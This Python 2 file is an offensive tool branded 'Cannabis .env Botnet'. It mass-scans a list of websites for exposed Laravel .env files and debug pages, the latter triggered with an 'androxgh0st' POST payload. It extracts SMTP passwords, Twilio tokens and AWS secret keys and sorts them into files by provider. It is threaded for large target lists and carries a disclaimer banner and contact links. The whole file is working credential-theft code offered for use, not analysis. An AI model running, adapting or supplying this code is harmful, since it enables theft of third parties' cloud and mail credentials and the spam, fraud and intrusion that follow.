# -*- coding: utf-8 -*-
#thnks for luqman add some code from PandShop,JiwaTerlena
from multiprocessing.dummy import Pool
import warnings,random,socket
from re import findall as reg
import requests, re, sys, os
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)
from colorama import Fore
from colorama import Style
from pprint import pprint
from colorama import init
from time import time as timer  
import time
init()

Headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) "
                      "AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }

def sparkpostmail():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "sparkpostmail=on" in ip_listx:
    sparkpostmail = "on"
    return sparkpostmail
  else:
    sparkpostmail = "off"
    return sparkpostmail
def and1():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "and1=on" in ip_listx:
    and1 = "on"
    return and1
  else:
    and1 = "off"
    return and1
def mandrillapp():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "mandrillapp=on" in ip_listx:
    mandrillapp = "on"
    return mandrillapp
  else:
    mandrillapp = "off"
    return mandrillapp
def zoho():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "zoho=on" in ip_listx:
    zoho = "on"
    return zoho
  else:
    zoho = "off"
    return zoho
def sendgrid():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "sendgrid=on" in ip_listx:
    sendgrid = "on"
    return sendgrid
  else:
    sendgrid = "off"
    return sendgrid
def office365():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "office365=on" in ip_listx:
    office365 = "on"
    return office365
  else:
    office365 = "off"
    return office365
def mailgun():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "mailgun=on" in ip_listx:
    mailgun = "on"
    return mailgun
  else:
    mailgun = "off"
    return mailgun

def aws():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "aws=on" in ip_listx:
    aws = "on"
    return aws
  else:
    aws = "off"
    return aws
def twillio():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "twillio=on" in ip_listx:
    twillio = "on"
    return twillio
  else:
    twillio = "off"
    return twillio

def AWS_ACCESS_KEY():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "AWS_ACCESS_KEY=on" in ip_listx:
    AWS_ACCESS_KEY = "on"
    return AWS_ACCESS_KEY
  else:
    AWS_ACCESS_KEY = "off"
    return AWS_ACCESS_KEY

def AWS_KEY():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "AWS_KEY=on" in ip_listx:
    AWS_KEY = "on"
    return AWS_KEY
  else:
    AWS_KEY = "off"
    return AWS_KEY


def prepare(sites):

    try:
      meki = requests.get(sites+'/.env',headers=Headers,timeout=5)
      if 'DB_PASSWORD=' in meki.text:
        print "\033[1;40m[x] {} ===>   \033[1;32;40mSuccess".format(str(sites))
        open('config-'+year+month+day+'.txt', 'a').write("\n---------------Cannabis env-------------\n"+sites+"\n"+meki.text + '\n-----------------------------------------\n\n')
      else:
        print "\033[1;40m[x] {} ===>   \033[1;31;40mFailed".format(str(sites))
    except Exception as e:
        pass

def get_smtp(url,text):
  try:
    if "MAIL_HOST" in text:
      if "MAIL_HOST=" in text:
        
        mailhost = reg("\nMAIL_HOST=(.*?)\n", text)[0]
        mailport = reg("\nMAIL_PORT=(.*?)\n", text)[0]
        mailuser = reg("\nMAIL_USERNAME=(.*?)\n", text)[0]
        mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", text)[0]
        build = 'URL: '+str(url)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)
        remover = str(build).replace('\r', '')
        if ".amazonaws.com" in text and aws() == "on":
          mailhost = reg("\nMAIL_HOST=(.*?)\n", text)[0]
          mailport = reg("\nMAIL_PORT=(.*?)\n", text)[0]
          mailuser = reg("\nMAIL_USERNAME=(.*?)\n", text)[0]
          mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", text)[0]
          getcountry = reg('email-smtp.(.*?).amazonaws.com', mailhost)[0]
          build = 'URL: '+str(url)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)
          remover = str(build).replace('\r', '')
          print "\033[1;40m[x] {} ===>   \033[1;32;40m amazonaws".format(str(url))
          save = open(getcountry+'.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        if "smtp.sendgrid.net" in str(mailhost) and sendgrid() == "on":

          print "\033[1;40m[x] {} ===>   \033[1;32;40mSendgrid".format(str(url))
          save = open('Resultz/sendgrid.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        if "mailgun.org" in str(mailhost) and mailgun() == "on":
          print "\033[1;40m[x] {} ===>   \033[1;32;40mmailgun".format(str(url))
          save = open('Resultz/mailgun.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        if "sparkpostmail.com" in str(mailhost) and sparkpostmail() == "on":
          print "\033[1;40m[x] {} ===>   \033[1;32;40msparkpostmail".format(str(url))
          save = open('Resultz/sparkpostmail.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        if "mandrillapp.com" in str(mailhost) and mandrillapp() == "on":
          print "\033[1;40m[x] {} ===>   \033[1;32;40mmandrillapp".format(str(url))
          save = open('Resultz/mandrill.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        if "zoho." in str(mailhost) and zoho() == "on":
          print "\033[1;40m[x] {} ===>   \033[1;32;40mzoho".format(str(url))
          save = open('Resultz/zoho.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        if "1and1." in str(mailhost) and and1() == "on":
          print "\033[1;40m[x] {} ===>   \033[1;32;40m1and1".format(str(url))
          save = open('Resultz/1and1.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        if "smtp.office365.com" and office365() == "on":
          print "\033[1;40m[x] {} ===>   \033[1;32;40moffice365".format(str(url))
          save = open('Resultz/office365.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        if mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "":
          print "\033[1;40m[x] {} ===>   \033[1;31;40mFailed".format(str(url))
        print "\033[1;40m[x] {} ===>   \033[1;32;40mSMTP".format(str(url))
        save = open('Resultz/SMTP_RANDOM.txt', 'a')
        save.write(str(remover)+'\n\n')
        save.close()
    else:
      print "\033[1;40m[x] {} ===>   \033[1;31;40mFailed SMTP".format(str(url))

    if "TWILIO_ACCOUNT_SID=" in text and twillio() == "on":
      print "\033[1;40m[x] {} ===>   \033[1;32;40mTwillio".format(url)
      acc_sid = reg('\nTWILIO_ACCOUNT_SID=(.*?)\n', text)[0]
      acc_key = reg('\nTWILIO_API_KEY=(.*?)\n', text)[0]
      sec = reg('\nTWILIO_API_SECRET=(.*?)\n', text)[0]
      chatid = reg('\nTWILIO_CHAT_SERVICE_SID=(.*?)\n', text)[0]
      phone = reg('\nTWILIO_NUMBER=(.*?)\n', text)[0]
      auhtoken = reg('\nTWILIO_AUTH_TOKEN=(.*?)\n', text)[0]

      build = 'URL: '+url+'\nTWILIO_ACCOUNT_SID: '+str(acc_sid)+'\nTWILIO_API_KEY: '+str(acc_key)+'\nTWILIO_API_SECRET: '+str(sec)+'\nTWILIO_CHAT_SERVICE_SID: '+str(chatid)+'\nTWILIO_NUMBER: '+str(phone)+'\nTWILIO_AUTH_TOKEN: '+str(auhtoken)
      remover = build.replace('\r', '')
      save = open('Resultz/twillio.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
    elif 'TWILIO_ACCOUNT_SID=' not in text or 'TWILIO_ACCOUNT_SID=' in text and twillio() == "off":
      pass
    else:
      print "\033[1;40m[x] {} ===>   \033[1;31;40mFailed Twillio".format(str(url))

    if 'AWS_ACCESS_KEY_ID=' in text and AWS_ACCESS_KEY() == "on":
      print "\033[1;40m[x] {} ===>   \033[1;32;40mAWS_ACCESS_KEY".format(str(url))
      mailhost = reg("\nAWS_ACCESS_KEY_ID=(.*?)\n", text)[0]
      mailport = reg("\nAWS_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
      mailuser = reg("\nAWS_DEFAULT_REGION=(.*?)\n", text)[0]
      build = 'URL: '+str(url)+'\nAWS_ACCESS_KEY_ID: '+str(mailhost)+'\nAWS_SECRET_ACCESS_KEY: '+str(mailport)+'\nAWS_DEFAULT_REGION: '+str(mailuser)
      remover = str(build).replace('\r', '')
      save = open('Resultz/'+mailuser+'.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
    elif 'AWS_ACCESS_KEY_ID=' not in text or 'AWS_ACCESS_KEY_ID=' in text and AWS_ACCESS_KEY() == "off":
      pass
    else:
      print "\033[1;40m[x] {} ===>   \033[1;31;40mFailed AWS_ACCESS_KEY".format(str(url))

    if 'AWS_KEY=' in text and AWS_KEY() == "on":
      print "\033[1;40m[x] {} ===>   \033[1;32;40mAWS_ACCESS_KEY".format(str(url))
      mailhost = reg("\nAWS_KEY=(.*?)\n", text)[0]
      mailport = reg("\nAWS_SECRET=(.*?)\n", text)[0]
      mailuser = reg("\nAWS_REGION=(.*?)\n", text)[0]
      build = 'URL: '+str(url)+'\nAWS_KEY: '+str(mailhost)+'\nAWS_SECRET: '+str(mailport)+'\nAWS_REGION: '+str(mailuser)
      remover = str(build).replace('\r', '')
      save = open('Resultz/'+mailuser+'.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
    elif 'AWS_KEY=' not in text or 'AWS_KEY=' in text and AWS_KEY() == "off":
      pass
    else:
      print "\033[1;40m[x] {} ===>   \033[1;31;40mFailed AWS_KEY".format(str(url))


  except Exception as e:
    pass
def get_smtp2(url,text):
  try:
    if "MAIL_HOST" in text:
      if "<td>MAIL_HOST</td>" in text:
        print "\033[1;40m[x] {} ===>   \033[1;32;40mSMTP".format(str(url))
        mailhost = reg('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
        mailport = reg('<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
        mailuser = reg('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
        mailpass = reg('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
        build = 'URL: '+str(url)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)
        remover = str(build).replace('\r', '')
        if ".amazonaws.com" in text and aws() == "on":
          mailhost = reg("\nMAIL_HOST=(.*?)\n", text)[0]
          mailport = reg("\nMAIL_PORT=(.*?)\n", text)[0]
          mailuser = reg("\nMAIL_USERNAME=(.*?)\n", text)[0]
          mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", text)[0]
          getcountry = reg('email-smtp.(.*?).amazonaws.com', mailhost)[0]
          build = 'URL: '+str(url)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)
          remover = str(build).replace('\r', '')
          print "\033[1;40m[x] {} ===>   \033[1;32;40m amazonaws".format(str(url))
          save = open(getcountry+'.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        if "smtp.sendgrid.net" in str(mailhost) and sendgrid() == "on":

          print "\033[1;40m[x] {} ===>   \033[1;32;40mSendgrid".format(str(url))
          save = open('Resultz/sendgrid.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        if "mailgun.org" in str(mailhost) and mailgun() == "on":
          print "\033[1;40m[x] {} ===>   \033[1;32;40mmailgun".format(str(url))
          save = open('Resultz/mailgun.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        if "sparkpostmail.com" in str(mailhost) and sparkpostmail() == "on":
          print "\033[1;40m[x] {} ===>   \033[1;32;40msparkpostmail".format(str(url))
          save = open('Resultz/sparkpostmail.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        if "mandrillapp.com" in str(mailhost) and mandrillapp() == "on":
          print "\033[1;40m[x] {} ===>   \033[1;32;40mmandrillapp".format(str(url))
          save = open('Resultz/mandrill.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        if "zoho." in str(mailhost) and zoho() == "on":
          print "\033[1;40m[x] {} ===>   \033[1;32;40mzoho".format(str(url))
          save = open('Resultz/zoho.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        if "1and1." in str(mailhost) and and1() == "on":
          print "\033[1;40m[x] {} ===>   \033[1;32;40m1and1".format(str(url))
          save = open('Resultz/1and1.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        if "smtp.office365.com" and office365() == "on":
          print "\033[1;40m[x] {} ===>   \033[1;32;40moffice365".format(str(url))
          save = open('Resultz/office365.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        if mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "":
          print "\033[1;40m[x] {} ===>   \033[1;31;40mFailed".format(str(url))
        print "\033[1;40m[x] {} ===>   \033[1;32;40mSMTP".format(str(url))
        save = open('Resultz/SMTP_RANDOM.txt', 'a')
        save.write(str(remover)+'\n\n')
        save.close()
    else:
      print "\033[1;40m[x] {} ===>   \033[1;31;40mFailed SMTP".format(str(url))

    if '<td>TWILIO_ACCOUNT_SID</td>' in text and twillio() == "on":
      print "\033[1;40m[x] {} ===>   \033[1;32;40mTwillio".format(str(url))
      acc_sid = reg('<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      acc_key = reg('<td>TWILIO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      sec = reg('<td>TWILIO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      chatid = reg('<td>TWILIO_CHAT_SERVICE_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      phone = reg('<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      auhtoken = reg('<td>TWILIO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      build = 'URL: '+str(url)+'\nTWILIO_ACCOUNT_SID: '+str(acc_sid)+'\nTWILIO_API_KEY: '+str(acc_key)+'\nTWILIO_API_SECRET: '+str(sec)+'\nTWILIO_CHAT_SERVICE_SID: '+str(chatid)+'\nTWILIO_NUMBER: '+str(phone)+'\nTWILIO_AUTH_TOKEN: '+str(auhtoken)
      remover = str(build).replace('\r', '')
      save = open('Resultz/TWILLIO.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
    else:
      print "\033[1;40m[x] {} ===>   \033[1;31;40mFailed Twillio".format(str(url))

  except Exception as e:
    pass


def di_chckngntd(url):
  try:
    text = '\033[32;1m#\033[0m '+url
    headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
    get_source = requests.get(url+"/.env", headers=headers, timeout=5, verify=False, allow_redirects=False).text
    if "APP_KEY=" in str(get_source):
      get_smtp(url+"/.env",str(get_source))
    else:
      get_source = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=5, verify=False, allow_redirects=False).text
      if "<td>APP_KEY</td>" in get_source:
        get_smtp2(url,get_source)
      else:
        print "\033[1;40m[x] {} ===>   \033[1;31;40mFailed".format(str(url))
  except Exception as e:
    
    pass






def checkset():

  AWS_ACCESS_KEYx=AWS_ACCESS_KEY()
  AWS_KEYx=AWS_KEY()
  twilliox=twillio()
  awsx=aws()
  sparkpostmailx = sparkpostmail()
  and1x = and1()
  mandrillappx = mandrillapp()
  zohox = zoho()
  sendgridx = sendgrid()
  office365x = office365()
  mailgunx = mailgun()

  print "amazonaws:"+awsx+"|twillio:"+twilliox+"|AWS_KEY:"+AWS_KEYx+"|AWS_ACCESS_KEY:"+AWS_ACCESS_KEYx+"|sparkpostmail:"+sparkpostmailx+"\n1and1:"+and1x+"|mandrillapp:"+mandrillappx+"|zoho:"+zohox+"|sendgrid:"+sendgridx+"|office365:"+office365x+"|mailgun:"+mailgunx

def logo():
    clear = "\x1b[0m"

    x = """\033[1;32;40m
_________                         _     _     
\_   ___ \ __ _ _ __  _ __   __ _| |__ (_)___ 
/    \  \// _` | '_ \| '_ \ / _` | '_ \| / __|
\     \___ (_| | | | | | | | (_| | |_) | \__ \\
 \______  /__,_|_| |_|_| |_|\__,_|_.__/|_|___/
        \/ 
 \033[1;32;40mNot responsible for any illegal
 \033[1;32;40musage of this tool.\033[0;40m

 \033[1;30;40mAuthor   \033[1;40m: \033[1;33;40mICQ:https://icq.im/greatzcode
 \033[1;30;40mLink     \033[1;40m: \033[1;33;40mhttps://github.com/boters/Cannabis/
 \033[1;30;40mVersion  \033[1;40m: \033[1;33;40m.env Botnet
"""
    print x
    
logo()

def menucit():
  sdx = """
 \033[1;37;40m1]  grab .env [Get all data in .env]
 \033[1;37;40m2]  grab .env [Grab .env and Laravel debug with settings.ini]
 \033[1;37;40m3]  check settings.ini
 """
  print sdx

def jembotngw(sites):
  if 'http' not in sites:
    site = 'http://'+sites

    prepare(site)
  else:
    prepare(sites)





def jembotngw2(sites):


  if 'http' not in sites:
    site = 'http://'+sites

    di_chckngntd(site)
  else:
    di_chckngntd(sites)

def prepare2(sites):

  di_chckngntd(sites)





def nowayngntd():

  Targetssa = raw_input("\033[1;37;40mInput Your List : ") #for date
  ip_list = open(Targetssa, 'r').read().split('\n')
  for sites in ip_list:
    if 'http' not in sites:
      site = 'http://'+sites

      prepare(site)
    else:
      prepare(sites)

def makethread(jumlah):
  try:
    nam = raw_input("\033[1;37;40mInput Your List : ") #for date
    th = int(jumlah)
    time.sleep(3)
    liss = [ i.strip() for i in open(nam, 'r').readlines() ]
    zm = Pool(th)
    zm.map(jembotngw, liss)
  except Exception as e:
    pass


def nowayngntd2():

  Targetssa = raw_input("\033[1;37;40mInput Your List : ") #for date
  ip_list = open(Targetssa, 'r').read().split('\n')
  for sites in ip_list:
    if 'http' not in sites:
      site = 'http://'+sites

      prepare2(site)
    else:
      prepare2(sites)

def makethread2(jumlah):
  try:
    nam = raw_input("\033[1;37;40mInput Your List : ") #for date
    th = int(jumlah)
    time.sleep(3)
    liss = [ i.strip() for i in open(nam, 'r').readlines() ]
    zm = Pool(th)
    zm.map(jembotngw2, liss)
  except Exception as e:
    pass


def cinxx():
  try:
    menucit()
    Targetssad = raw_input("\033[1;37;40mChoice : ") #for date
    if Targetssad == "1":

      Targetssas = raw_input("\033[1;37;40mWith thread or no [y/n] : ") #for date
      if Targetssas == "y":
        jumlahkn = raw_input("\033[1;37;40mThread : ") #for date
        makethread(jumlahkn)
      else:
        nowayngntd()
    elif Targetssad == "3":
      checkset()
    else:
      Targetssas = raw_input("\033[1;37;40mWith thread or no [y/n] : ") #for date
      if Targetssas == "y":
        jumlahkn = raw_input("\033[1;37;40mThread : ") #for date
        makethread2(jumlahkn)
      else:
        nowayngntd2()
  except KeyboardInterrupt as e:
    print("Exit Program")
    sys.exit()

cinxx()
